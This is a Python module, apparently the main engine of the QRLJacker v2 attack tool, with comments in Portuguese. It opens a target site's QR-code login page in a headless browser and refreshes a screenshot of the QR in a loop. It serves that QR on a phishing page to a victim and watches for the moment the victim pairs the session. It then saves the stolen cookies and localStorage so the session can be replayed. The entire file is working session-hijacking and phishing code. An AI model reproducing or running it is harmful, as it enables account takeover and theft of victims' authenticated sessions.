# -*- coding: utf-8 -*-
"""Motor principal do QRLJacker v2.

Abre a página de login do alvo em um navegador headless, captura o QR em
loop, serve o QR numa página de phishing e detecta quando a vítima pareia
a sessão — então salva cookies + localStorage para replay.
"""
import threading
import time

from selenium.webdriver.common.by import By

from core import settings
from core.color import status, warning, error, info
from core.browser import make_driver, visible_elements, best_square
from core.session_store import save_session
from core.server import PhishingServer

RUNNING = "running"
CAPTURED = "captured"
STOPPED = "stopped"


class Grabber:
    def __init__(self, module, host=None, port=None, headless=True,
                 browser="auto", useragent="(random)", once=False,
                 once_timeout=None):
        self.module = module
        self.headless = headless
        self.browser = browser if browser and browser != "auto" else getattr(module, "browser", "auto")
        self.useragent = useragent
        self.once = once
        self.once_timeout = float(once_timeout) if once_timeout else settings.ONCE_TIMEOUT
        self.host = host or settings.HOST
        self.port = port or settings.PORT
        self.state = "idle"
        self.driver = None
        self.ua = ""
        self.qr_png = settings.SHOTS_DIR / f"{module.name}.png"
        self.debug_png = settings.SHOTS_DIR / f"{module.name}_debug.png"
        self._lock = threading.Lock()
        self._last_qr_ok = 0.0

    # ------------------------------------------------------------------ #
    # Helpers                                                            #
    # ------------------------------------------------------------------ #
    def _find_qr(self):
        """Localiza o elemento do QR: seletores do módulo primeiro, depois
        heurística do 'maior quadrado visível' (canvas/img)."""
        m = self.module
        cands = []
        for sel in m.qr_selectors:
            els = visible_elements(self.driver, sel)
            if els:
                cands = els
                break
        if not cands:
            pool = (visible_elements(self.driver, "canvas")
                    + visible_elements(self.driver, "img"))
            sq = best_square(pool)
            if sq:
                cands = [sq]
        if not cands:
            return None
        return max(cands, key=lambda e: e.size["width"] * e.size["height"])

    def _success(self):
        m = self.module
        try:
            for sel in m.success_selectors:
                if self.driver.find_elements(By.CSS_SELECTOR, sel):
                    return True
            url = self.driver.current_url
            for frag in m.success_url_contains:
                if frag and frag in url:
                    return True
        except Exception:
            pass
        return False

    def _grab_payload(self):
        data = {"cookies": [], "localStorage": {}}
        try:
            data["cookies"] = self.driver.get_cookies()
        except Exception as e:
            warning("Falha ao coletar cookies: " + str(e))
        try:
            data["localStorage"] = self.driver.execute_script(
                "return Object.assign({}, window.localStorage);") or {}
        except Exception:
            pass
        return data

    def _open_target(self):
        m = self.module
        self.driver.get(m.url)
        time.sleep(settings.PAGE_SETTLE_SECONDS)
        for xp in m.pre_click_xpath:
            try:
                for el in self.driver.find_elements(By.XPATH, xp):
                    if el.is_displayed():
                        el.click()
                        info(f"Pré-ação executada: {xp}")
                        time.sleep(settings.PAGE_SETTLE_SECONDS)
                        break
            except Exception:
                continue

    # ------------------------------------------------------------------ #
    # Loops (threads)                                                    #
    # ------------------------------------------------------------------ #
    def _qr_loop(self):
        warned = False
        while self.state == RUNNING:
            try:
                el = self._find_qr()
                if el:
                    el.screenshot(str(self.qr_png))
                    self._last_qr_ok = time.time()
                    if warned:
                        info(f"QR capturado novamente [{self.module.name}]")
                    warned = False
                else:
                    if not warned:
                        warning(f"QR não localizado ainda [{self.module.name}] — "
                                f"debug em shots/{self.debug_png.name}")
                        try:
                            self.driver.save_screenshot(str(self.debug_png))
                        except Exception:
                            pass
                        warned = True
                    if time.time() - self._last_qr_ok > settings.RELOAD_AFTER:
                        info("Recarregando a página do alvo…")
                        self._open_target()
                        self._last_qr_ok = time.time()
            except Exception as e:
                if settings.DEBUG:
                    error("qr_loop: " + repr(e))
            if self.once and self.qr_png.exists() and self.qr_png.stat().st_size > 500:
                status("--once: QR capturado, finalizando.")
                return
            time.sleep(settings.QR_REFRESH_SECONDS)

    def _watch_loop(self):
        while self.state == RUNNING:
            if self._success():
                status(f"Sessão estabelecida em '{self.module.name}'!")
                with self._lock:
                    payload = self._grab_payload()
                    payload["useragent"] = self.ua
                    try:
                        payload["final_url"] = self.driver.current_url
                    except Exception:
                        pass
                save_session(self.module.name, self.module.url, self.ua, payload,
                             extra={"browser": self.browser, "headless": self.headless})
                self.state = CAPTURED
                try:
                    self.driver.quit()
                except Exception:
                    pass
                self.driver = None
                return
            time.sleep(settings.POLL_SECONDS)

    # ------------------------------------------------------------------ #
    # Execução principal                                                 #
    # ------------------------------------------------------------------ #
    def run(self, with_server=True):
        self.state = RUNNING
        mode = "headless" if self.headless else "visível"
        status(f"Módulo: {self.module.name} | navegador: {self.browser} | modo: {mode}")
        if self.module.note:
            warning(f"Nota do módulo: {self.module.note}")

        if self.once:
            try:
                self.qr_png.unlink(missing_ok=True)  # evita falso positivo de execução anterior
            except Exception:
                pass
        self.driver, self.ua = make_driver(self.browser, self.headless, self.useragent)
        self._last_qr_ok = time.time()
        self._open_target()

        qr_thread = threading.Thread(target=self._qr_loop, name="QR-updater", daemon=True)
        qr_thread.start()
        threading.Thread(target=self._watch_loop, name="Session-watcher", daemon=True).start()
        deadline = time.time() + self.once_timeout

        server = None
        if with_server:
            server = PhishingServer(self.host, self.port,
                                    state_provider=lambda: self.state,
                                    qr_path=self.qr_png,
                                    template_ctx=self.module.phishing)
            server.start()
            print()
            info(f"Página da vítima: http://<seu-ip>:{self.port}/")
            info("QR local (você): shots/" + self.qr_png.name)
            print()

        try:
            while self.state == RUNNING:
                if self.once:
                    # --once: sai quando o QR-loop termina ou ao esgotar o timeout
                    if not qr_thread.is_alive():
                        break
                    if time.time() >= deadline:
                        warning(f"--once: timeout de {self.once_timeout:.0f}s sem capturar o QR.")
                        self.state = STOPPED
                        break
                time.sleep(1)
        except KeyboardInterrupt:
            print()
            warning("Interrompido pelo operador.")
            self.state = STOPPED

        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None
        if server:
            server.stop()
        return self.state == CAPTURED
